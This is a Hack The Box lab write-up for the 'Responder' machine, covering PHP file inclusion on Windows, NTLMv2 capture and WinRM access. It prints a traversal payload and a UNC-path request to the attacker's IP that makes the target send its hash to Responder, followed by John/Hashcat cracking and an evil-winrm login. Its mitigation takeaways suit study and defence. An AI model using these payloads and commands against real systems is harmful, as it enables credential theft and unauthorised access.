Yooo guys, it's ju4dy the landlord again.

# Responder — Hack The Box Starting Point

|  |  |
| --- | --- |
| **Platform** | Hack The Box — Starting Point |
| **Tier** | 1 |
| **Difficulty** | Very easy |
| **Operating system** | Windows |
| **Target IP** | `10.129.95.234` |
| **Skills** | Virtual hosts, local/remote file inclusion, LLMNR and NBT-NS poisoning, NTLMv2 cracking, WinRM |

## Overview

Responder is a Windows host running a small PHP web application on Apache. The application takes a language
file name from a query parameter and includes it directly, which gives both local file inclusion (LFI) and
remote file inclusion (RFI). Pointing that parameter at a UNC path makes the server authenticate to us over
SMB, and Responder captures the resulting NTLMv2 challenge-response.

The captured hash belongs to `RESPONDER\Administrator`; `rockyou.txt` cracks it in under a second. From there
WinRM on port `5985` provides an administrative shell and the flag.

## Enumeration

```bash
nmap -sVC 10.129.95.234
```

```text
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-14 11:28 +0100
Nmap scan report for 10.129.95.234
Host is up (0.33s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Two services stand out:

- **`80/tcp`** — Apache with PHP 8.1 running on Windows. The `Win64` tag in the header matters later, because
  a Windows host resolves UNC paths (and therefore triggers SMB authentication) natively.
- **`5985/tcp`** — WinRM. There are no SMB ports (`139`/`445`) exposed externally, so the only way to reach SMB
  is to make the target *initiate* the connection itself.

### Virtual host

The web server answers on a hostname rather than the bare IP, so the name is added to the local hosts file:

```bash
sudo nano /etc/hosts
```

```text
10.129.95.234 unika.htb
```

With `http://unika.htb/` resolving, the site loads: a small page with a language selector that reloads itself
with a `page` query parameter, for example `?page=french.html`.

## Exploitation

### Local file inclusion

The `page` parameter is concatenated into a server-side `include`, so traversal is immediate. Submitting a
relative path that walks out of the web root reads a file from the operating system:

```text
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

The response contains the contents of the Windows `hosts` file, which confirms two things: the parameter is
vulnerable to path traversal, and the process can read outside the web directory.

### Remote file inclusion and NTLM capture

A Windows host that is asked to include `//<host>/<share>` will resolve and authenticate to that SMB share.
That behavior converts the RFI into an outbound authentication request we control. Start Responder on the
VPN interface and wait for it:

```bash
sudo responder -I tun0
```

The interface must be the tunnel to the target (`tun0`); on this host `eth0` did not exist, and Responder
reports that plainly. With the listener up, trigger the inclusion:

```text
http://unika.htb/index.php?page=//10.10.17.166/somefile
```

The server resolves the UNC path, sends an SMB negotiation and then an NTLM authentication attempt, and
Responder logs it:

```text
[SMB] NTLMv2-SSP Client   : 10.129.95.234
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:32e926b3e8785e4b:E4B2C736F24ECCC5AFD7EBA83223B225:01010000...00000000000000
```

The user name and the hash are all that is needed. Note that the request is triggered through the web
application, so the authentication originates from the target — the SMB port being filtered is irrelevant.

### Cracking the NTLMv2 hash

The hash is written to a file exactly as Responder printed it, then handed to John the Ripper:

```bash
echo "Administrator::RESPONDER:32e926b3e8785e4b:E4B2C736F24ECCC5AFD7EBA83223B225:01010000..." > hash.txt
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```text
badminton        (Administrator)
```

Password recovered: `badminton`. Hashcat reaches the same result with mode `5600`:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

## Foothold — WinRM

WinRM was open from the start, so the cracked password can be used directly without touching RDP or SMB:

```bash
evil-winrm -i 10.129.95.234 -u Administrator -p badminton
```

```text
*Evil-WinRM* PS C:\Users\Administrator> whoami
responder\administrator
```

The Administrator desktop and documents were empty, but `C:\Users` also contains a second account, `mike`:

```text
*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/9/2022   5:35 PM                Administrator
d-----          3/9/2022   5:33 PM                mike
d-r---        10/10/2020  12:37 PM                Public
```

The flag is on that account's desktop:

```text
*Evil-WinRM* PS C:\Users\mike\Desktop> type flag.txt
[flag redacted]
```

## Key takeaways

- **Never let user input choose a file to include.** Restricting `page` to a fixed allow-list of language
  files, or disabling `allow_url_include`, removes both the LFI and the RFI in one change.
- **LLMNR and NBT-NS are poisonable by design.** Disabling both on the network, and requiring SMB signing,
  removes most of the value of a captured challenge-response — an attacker ends up with a hash they cannot
  relay.
- **An NTLMv2 hash is a password guess away from being a credential.** `badminton` would not survive a serious
  password policy, and a privileged account should never be protected by a dictionary word.
- **Outbound SMB should be blocked at the perimeter.** A web server has no reason to open SMB sessions to
  arbitrary hosts; egress filtering here would have broken the entire chain.
- **WinRM access is equivalent to interactive logon.** Restricting `5985` to administrative jump hosts limits
  the damage once an administrator password is recovered.
